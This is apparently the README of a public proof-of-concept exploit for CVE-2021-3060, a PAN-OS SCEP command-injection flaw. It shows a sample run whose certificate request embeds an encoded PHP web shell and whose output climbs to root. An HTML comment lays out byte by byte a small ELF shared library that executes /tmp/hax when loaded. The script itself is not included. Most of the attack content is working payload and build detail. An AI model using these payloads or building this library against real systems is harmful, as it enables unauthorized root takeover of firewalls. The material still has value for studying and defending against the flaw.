# CVE-2021-3060 POC/ Exploit

## Description: 
An OS command injection vulnerability in the Simple Certificate Enrollment Protocol (SCEP) feature of PAN-OS software allows an unauthenticated network-based attacker with specific knowledge of the firewall configuration to execute arbitrary code with root user privileges. The attacker must have network access to the GlobalProtect interfaces to exploit this issue. This issue impacts: PAN-OS 8.1 versions earlier than PAN-OS 8.1.20-h1; PAN-OS 9.0 versions earlier than PAN-OS 9.0.14-h3; PAN-OS 9.1 versions earlier than PAN-OS 9.1.11-h2; PAN-OS 10.0 versions earlier than PAN-OS 10.0.8; PAN-OS 10.1 versions earlier than PAN-OS 10.1.3. Prisma Access customers with Prisma Access 2.1 Preferred and Prisma Access 2.1 Innovation firewalls are impacted by this issue.   <br>                                                                                                                                                                   
## Weaknesses: 
CWE-78 <br>
## Link: 
https://nvd.nist.gov/vuln/detail/CVE-2021-3060 <br>

example output:

```
$ python3 cve-2021-3060.py http://panw.local test-scep-profile
Certificate Request:
    Data:
        Version: 0 (0x0)
        Subject: serialNumber=test, CN=uid=99(nobody) gid=99(nobody) groups=99(nobody)
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (512 bit)
                Modulus:
                    00:be:e2:cc:14:7e:94:ef:5d:59:1c:3b:17:92:c0:
                    34:ce:10:67:c7:c4:26:24:f1:52:b4:65:c7:a6:68:
                    c4:2b:ef:99:7c:f8:53:c3:ad:0b:f0:d0:8e:f2:62:
                    94:52:4c:1b:bb:c9:47:63:35:1b:f3:f6:fe:1b:f4:
                    d9:45:44:64:93
                Exponent: 65537 (0x10001)
        Attributes:
            challengePassword        :challenge
    Signature Algorithm: sha256WithRSAEncryption
         a9:c1:56:6d:86:4f:3e:d6:5a:99:33:37:f6:40:a6:7d:19:0c:
         63:3d:a2:bd:d1:45:e9:f2:50:b3:3c:65:fc:a7:9b:3e:81:64:
         d1:96:99:d6:f4:9b:a2:ed:3c:5d:da:ec:bb:69:55:e0:fc:59:
         53:30:3f:a7:ed:d6:71:da:a6:7e
-----BEGIN CERTIFICATE REQUEST-----
MIIBCTCBtAIBADA1MQ0wCwYDVQQFEwR0ZXN0MSQwIgYDVQQDFBs8P3BocCBwYXNz
dGhydSgkX0dFVFswXSk7Pz4wXDANBgkqhkiG9w0BAQEFAANLADBIAkEAvuLMFH6U
711ZHDsXksA0zhBnx8QmJPFStGXHpmjEK++ZfPhTw60L8NCO8mKUUkwbu8lHYzUb
8/b+G/TZRURkkwIDAQABoBowGAYJKoZIhvcNAQkHMQsTCWNoYWxsZW5nZTANBgkq
hkiG9w0BAQsFAANBAKnBVm2GTz7WWpkzN/ZApn0ZDGM9or3RRenyULM8Zfynmz6B
ZNGWmdb0m6LtPF3a7LtpVeD8WVMwP6ft1nHapn4=
-----END CERTIFICATE REQUEST-----

uid=0(root) gid=0(root) groups=0(root)
```



<!--

      ╔═══════════════════════════════════════════════════════════════╗
      ║ badlib.xx -- a tiny ELF shared object by rqu                  ║
      ║ This will exec() /tmp/hax when dlopen()'d or loaded           ║
      ║ Originally released in binary form for my CVE-2021-3060 POC:  ║
      ║ https://gist.github.com/rqu1/8ed4f51fd90dd82fc89111340e26a756 ║
      ║ build the binary with https://github.com/netspooky/xx         ║
      ╚═══════════════════════════════════════════════════════════════╝
┌───────────┬───────────────────┬───────────────┬──────────────┬─────────────┐
│ Data      │  ELF header       │ PHDR          │ Code         │ Dynamic     │
├───────────┼───────────────────┼───────────────┼──────────────┼─────────────┤
├           │                   │               │              │             │
│ 0x00 -- ELF64 header (64 bytes)               │              │             │
├           │                   │               │              │             │
  7f "ELF"  ╞ ELF magic         │               │              │             │
  02        ╞ 64-bit            │               │              │             │
  01        ╞ little endian     │               │              │             │
  01        ╞ ELF version 1     │               │              │             │
  00        ╞ system V ABI      │               │              │             │
  0000 0000 ╒ padding           │               │              │             │
  0000 0000 ╘ must be 0         │               │              │             │
  0300      ╞ e_type: DYN       │               │              │             │
  3e00      ╞ e_machine: 62     │               │              │             │
  0100 0000 ╞ e_version: 1      │               │              │             │
├           │                   │               │              │             │
│ 0x18 -- PHDR #1 (56 bytes)    │               │              │             │
├           │                   │               │              │             │
  0200 0000 │                   ╞ PT_DYNAMIC    │              │             │
  0600 0000 │                   ╞ RW            │              │             │
  1800 0000 ╒ e_phoff: 0x18     │               │              │             │
  0000 0000 ╘                   │               │              │             │
  5800 0000 │                   ╒ p_vaddr: 0x58 │              │             │
  0000 0000 │                   ╘               │              │             │
  "rqu (-"  │                   │               │              │             │
  3800      ╞ e_phentsize: 0x38 │               │              │             │
  0200      ╞ e_phnum: 2        │               │              │             │
├           │                   │               │              │             │
│ 0x3a -- code (22 bytes)       │               │              │             │
├           │                   │               │              │             │
  31f6      │                   │               ╞ xor eax, eax │             │
  56        │                   │               ╞ push rsi     │             │
  48bb 2f74 │                   │               ╒ mov rbx,     │             │
  6d70 2f68 │                   │               │ "/tmp/hax"   │             │
  6178      │                   │               ╘              │             │
  53        │                   │               ╞ push rbx     │             │
  54        │                   │               ╞ push rsp     │             │
  5f        │                   │               ╞ pop rdi      │             │
  f7ee      │                   │               ╞ imul esi     │             │
  b03b      │                   │               ╞ mov al, 0x3b │             │
  0f05      │                   │               ╞ syscall      │             │
├           │                   │               │              │             │
│ 0x50 -- PHDR #2 (56 bytes)    │               │              │             │
├           │                   │               │              │             │
  0100 0000 │                   ╞ PT_LOAD       │              │             │
  0700 0000 │                   ╞ RWX           │              │             │
├           │                   │               │              │             │
│ 0x58 -- DYNAMIC section (48 bytes)            │              │             │
├           │                   │               │              │             │
  0500 0000 │                   ╒ p_offset: 5   │              ╒ DT_STRTAB   │
  0000 0000 │                   ╘               │              ╘             │
  0500 0000 │                   ╒ p_vaddr: 5    │              │             │
  0000 0000 │                   ╘               │              │             │
            │                   │               │              │             │
  0c00 0000 │                   │               │              ╒ DT_INIT     │
  0000 0000 │                   │               │              ╘             │
  3a00 0000 │                   │               │              ╒ address of  │
  0000 0000 │                   │               │              ╘ code: 0x3a  │
            │                   │               │              │             │
  0600 0000 │                   │               │              ╒ DT_SYMTAB   │
  0000 0000 │                   │               │              ╘             │
  0000 0000 │                   │               │              │             │
  0000 0000 │                   │               │              │             │
┌───────────┼───────────────────┼───────────────┼──────────────┼─────────────┤
│ Bytes     │  ELF header       │ PHDR          │ Code         │ Dynamic     │
└───────────┴───────────────────┴───────────────┴──────────────┴─────────────┘
-->


Note: The script is an updated version picked from https://gist.github.com/rqu1/8ed4f51fd90dd82fc89111340e26a756 and used python3.
